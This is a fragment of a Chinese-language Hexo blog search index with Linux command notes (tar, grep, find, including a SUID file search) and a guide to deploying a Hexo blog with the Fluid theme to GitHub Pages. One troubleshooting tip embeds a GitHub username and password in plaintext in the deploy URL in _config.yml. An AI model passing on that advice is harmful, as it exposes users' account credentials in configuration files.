class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ tar -czvf etc.tar.gz &#x2F;etc# 压缩$ tar -xzvf etc.tar.gz -C &#x2F;root&#x2F;etc # 解压</code></pre></div></li><li><p><code>grep</code>：在文本中执行关键词搜索，并显示匹配的结果</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ grep &#x2F;sbin&#x2F;nologin &#x2F;etc&#x2F;passwd# -n 显示行号； -v 反选信息</code></pre></div></li><li><p><code>find</code>：按照指定条件来查找文件</p>  <div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ find &#x2F;etc -name &quot;host*&quot; -print# 获取到&#x2F;etc中所有以 host 开头的文件列表$ find &#x2F; -perm -4000 -print# 在整个系统中搜索权限中包括 SUID 权限的所有文件$ find &#x2F; -user linuxprobe -exec cp -a &#123;&#125; &#x2F;root&#x2F;findresults&#x2F; \;# 在整个文件系统中找出所有归属于 linuxprobe 用户的文件并复制到&#x2F;root&#x2F;findresults 目录# 命令的结尾必须是“\;”！！！</code></pre></div></li></ul>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建Hexo个人博客</title>
    <link href="/posts/25ad3a99/"/>
    <url>/posts/25ad3a99/</url>
    
    <content type="html"><![CDATA[<p><a href="https://hexo.io/zh-cn/">Hexo</a>是一个快速、简洁且高效的博客框架。</p><p>Hexo主题较多，使用也比较方便，搭建一个博客记录生活学习。</p><p>环境搭建比较简单，记录一下中间遇到的小问题和主题的设置。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul><li>下载安装node.js（建议安装10.0版本以上）</li><li>下载安装git</li><li>下载安装hexo， <code>npm install -g hexo</code> （建议终端走代理）</li></ul><h3 id="本地搭建测试"><a href="#本地搭建测试" class="headerlink" title="本地搭建测试"></a>本地搭建测试</h3><ul><li>本地创建一个文件夹，如xxxblog</li><li>bash中切换到xxxblog目录下，输入 <code>hexo init</code></li><li>运行<code>hexo s</code>打开服务</li><li>本地localhost:4000上应该有博客的基本模板，本地搭建完成</li></ul><h3 id="关联git"><a href="#关联git" class="headerlink" title="关联git"></a>关联git</h3><ul><li>git与本地连接</li></ul><p>绑定信息：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ git config --global user.name &quot;你的GitHub用户名&quot;$ git config --global user.email &quot;你的GitHub绑定的邮箱&quot;</code></pre></div><p>然后生成密钥SSH key：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ ssh-keygen -t rsa -C &quot;你的GitHub绑定的邮箱&quot;</code></pre></div><p>获取生成的密钥信息放入GitHub-&gt;Settings-&gt;SSH and GPG keys：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ cat ~&#x2F;.ssh&#x2F;id_rsa.pub</code></pre></div><ul><li>git与博客绑定</li></ul><p>在Github上创建名字为<code>xxx.github.io</code>的项目，xxx为你的GitHub用户名，之后均用LeeX0示例。</p><p>打开xxxblog中的_config.yml，将其中的deployment选项的内容改为：</p><div class="code-wrapper"><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">deploy:  type: git  repo:     github: git@github.com:LeeX0&#x2F;LeeX0.github.io.git,master</code></pre></div><p>ps：如果之后推送时显示403错误，将其中的<code>repo: github: git@github.com:LeeX0/LeeX0.github.io.git,master</code></p><p>改为<code>repo: https://GitHub用户名:GitHub密码@github.com/LeeX0/LeeX0.github.io.git</code>尝试</p><ul><li><p>运行<code>npm install hexo-deployer-git –save</code>安装部署工具</p></li><li><p>运行推送</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo clean# clean 清除本地静态文件$ hexo g# generate 生成本地静态文件$ hexo d# deploy 推送部署文件至GitHub</code></pre></div></li><li><p>访问leex0.github.io即可查看博客</p></li></ul><h2 id="博客基本使用"><a href="#博客基本使用" class="headerlink" title="博客基本使用"></a>博客基本使用</h2><ul><li>新建文章</li></ul><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new &quot;postname&quot;# 创建新文章</code></pre></div><p>会在source-&gt;_posts文件夹内生成一个postname.md文件，用markdown格式进行编辑。</p><p>其中front-matter字段主要有：title 文章的标题、date 创建日期 、tags 标签、categories 分类。</p><p>tags 、categories写法建议:</p><div class="code-wrapper"><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">tags: - [tag1]- [tag2]categories:- [cate1]- [cate2-1,cate2-2]</code></pre></div><ul><li>插入图片</li></ul><p>文章插入图片source-&gt;image下，对应文件夹markdown相对路径即可/image/xxx.jpg。</p><ul><li>生成推送</li></ul><p>之后运行推送即可</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo clean# clean 清除本地静态文件$ hexo g# generate 生成本地静态文件$ hexo d# deploy 推送部署文件至GitHub</code></pre></div><h2 id="主题设置"><a href="#主题设置" class="headerlink" title="主题设置"></a>主题设置</h2><p>其中<a href="https://hexo.io/themes/">官网展示的主题</a>已经比较多了，<a href="https://www.zhihu.com/question/24422335">知乎的问答</a>也有比较多推荐。</p><p>我是用的<a href="https://github.com/fluid-dev/hexo-theme-fluid">Fluid</a>主题，介绍一下这个主题的设置。</p><ul><li>下载主题</li></ul><p><a href="https://github.com/fluid-dev/hexo-theme-fluid/archive/v1.8.0.zip">下载</a>最新主题版本，下载后解压到 themes 目录下并重命名为 fluid。</p><ul><li>修改配置</li></ul><p>修改Hexo目录下的<code>_config.yml</code>：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">theme: fluid  # 指定主题Language: zh-CN  # 指定语言，可不改</code></pre></div><p>之后正常生成推送即可，更多设置可参考<a href="https://github.com/fluid-dev/hexo-theme-fluid">文档</a>。</p>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blog</tag>
      
      <tag>Hexo</tag>
      
      <tag>Fluid</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
